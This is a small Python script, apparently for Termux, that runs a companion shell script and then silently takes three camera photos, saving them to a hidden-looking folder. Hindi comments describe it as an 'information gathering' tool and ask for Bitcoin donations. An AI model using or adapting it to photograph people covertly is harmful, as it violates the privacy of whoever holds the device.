import os
import  time
import random
print("ctrl + c exit") 
timea = 5
os.system("bash back.sh")
p = 0
while p < 3:
    ran = random.randint(1,100000)
    os.system(f"termux-camera-photo -c2 {ran}.jpeg")
    os.system(f"mv {ran}.jpeg /sdcard/tfish/back")
    print(f"photo click succses {p}")
    p +=1
    print(f"photo {ran}.jpg")
    time.sleep(timea)
#-------------------------------------------------------------------------------------------------------------
#this script made by me
# is script ka prayoge informasun gaddaring me kar sakate ho may issliy banaya hu
# duy me cophi  bit coin address = bc1qfng3pyqde9q62mdxrtlxe47fwtzmmv9wg8t7wc
# scrit accha lage to de dena 
# may adhi atomatic sms send script banane me laga hu
#                            THANK YOU FRENDS YOU ALWESS HAPPY
#MERA ENGLISH TODA KAMJOR HAI KOI MISTEK HUA HO TO SORRY 
